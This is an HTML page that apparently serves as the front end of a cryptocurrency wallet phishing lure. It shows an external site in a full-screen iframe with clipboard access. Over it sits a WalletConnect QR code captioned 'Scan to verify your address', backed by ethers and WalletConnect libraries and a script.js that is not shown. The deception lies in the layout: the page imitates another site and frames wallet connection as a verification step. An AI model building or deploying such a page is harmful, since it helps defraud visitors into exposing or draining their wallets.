<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Glimmer Data Shelter</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
    }
    iframe {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      border: none;
      z-index: 0;
    }
    #overlay {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 1;
      pointer-events: none;
    }
    #qrContainer {
      position: absolute;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      /* pas de fond blanc */
      pointer-events: auto;
      text-align: center;
      z-index: 2;
    }
    #qrcode {
      width: 250px;
      height: 250px;
      margin: 0 auto;
    }
    #status {
      margin-top: 8px;
      font-size: 14px;
      color: #000;
      background: transparent; /* pas de fond */
      padding: 2px 8px;
      border-radius: 4px;
    }
  </style>
</head>
<body>
  <!-- iframe avec scroll désactivé -->
  <iframe src="https://glimmer-data-shelter.lovable.app" 
          scrolling="no" 
          allow="clipboard-read; clipboard-write"></iframe>

  <div id="overlay">
    <div id="qrContainer">
      <div id="qrcode"></div>
      <div id="status">Scan to verify your address</div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.2.0/dist/ethers.umd.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.9.0/dist/index.umd.js"></script>
  <script src="script.js"></script>
</body>
</html>
